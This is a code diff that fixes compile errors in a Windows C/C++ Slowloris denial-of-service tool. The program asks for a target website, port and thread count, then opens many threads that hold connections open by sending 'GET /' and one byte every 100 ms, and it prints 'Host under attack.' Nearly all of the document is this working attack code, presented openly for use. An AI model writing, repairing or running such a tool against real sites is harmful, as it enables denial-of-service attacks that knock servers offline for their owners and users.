@@ -1,8 +1,8 @@
-//for clrscr()
-#include<conio.h>
-
 //for basic C funtions
 #include<stdio.h>
+
+//for string operations
+#include<string>
 
 //only for cin and cout
 #include<iostream>
@@ -40,11 +40,11 @@ DWORD WINAPI slowLorisAttack(PVOID p) {
     if(s != INVALID_SOCKET) {
       
       //using a GET header to fetch data
-      char *header = "GET /";
+      char header[] = "GET /";
       
       //a garbage value to be sent again and
       //again to keep the server busy
-      char *garbage = 'A';
+      char garbage = 'A';
       
       //connect to the server
       connect(s,(sockaddr*)socket_address,\
@@ -61,7 +61,7 @@ DWORD WINAPI slowLorisAttack(PVOID p) {
       //for sending garbage values again
       //and again
       while(1) {
-        n = send(s,garbage,1,0);
+        int n = send(s,&garbage,1,0);
         
         if(n == SOCKET_ERROR) {
           //if any error is encountered, move out
@@ -72,7 +72,7 @@ DWORD WINAPI slowLorisAttack(PVOID p) {
         
         //wait for 100ms before sending another
         //garbage value
-        sleep(100);
+        Sleep(100);
       }
       
       //if you moved out of the inner infinite
@@ -84,11 +84,11 @@ DWORD WINAPI slowLorisAttack(PVOID p) {
 
 int main() {
 
-  clrscr();
+  system("cls");
   
-  char *hostname;
-  char *portNumber;
-  char *threads;
+  string hostname;
+  string portNumber;
+  string threads;
   
   //unsigned long int in microsoft-ish language. LOL
   ULONG i;
@@ -112,9 +112,9 @@ int main() {
   <<"gl\n\n\n\n";
   
   cout<<"Enter the targe website's name:\t";
-  cin>>hostname;
+  getline(cin,hostname);
   
-  host = gethostbyname(hostname);
+  host = gethostbyname(hostname.data());
   
   if(!host) {
     cout<<"Invalid hostname";
@@ -123,10 +123,10 @@ int main() {
   
   cout<<"\nEnter port number (if you don't know"
   <<" what this means, simply enter 80):\t";
-  cin>>portNumber;
+  getline(cin,portNumber);
   
   cout<<"Number of threads you want to run:\t";
-  cin>>threads;
+  getline(cin,threads);
   
   //assign the IPv4 of the host entered to the
   //corresponding value in the socket_address
@@ -143,19 +143,21 @@ int main() {
   //network address and then assign to the
   //corresponding value in socket_address
   //structure
-  socket_address.sin_port = htons(strtoul(portNumber\
-  ,NULL,0);
+  socket_address.sin_port = htons(strtoul(\
+  portNumber.data(),NULL,0));
   
   cout<<"\n\n"; //just for a bit of neatness
   
   //make the requisite number of threads and GO
-  for(i = 0; i < strtoul(threads,null,0); i++) {
-    CreateThread(null,0,slowLorisAttack,&socket_address\
-    ,0,null);
-    cout<<i<<" threads created\n";
+  for(i = 0; i < strtoul(threads.data(),NULL,0); i++) {
+    CreateThread(NULL,0,slowLorisAttack,&socket_address\
+    ,0,NULL);
+    cout<<i+1<<" threads created\n";
   }
    
   cout<<"Host under attack.\n Press any key to terminate";
   
+  getchar();
+
   return 0;
 }
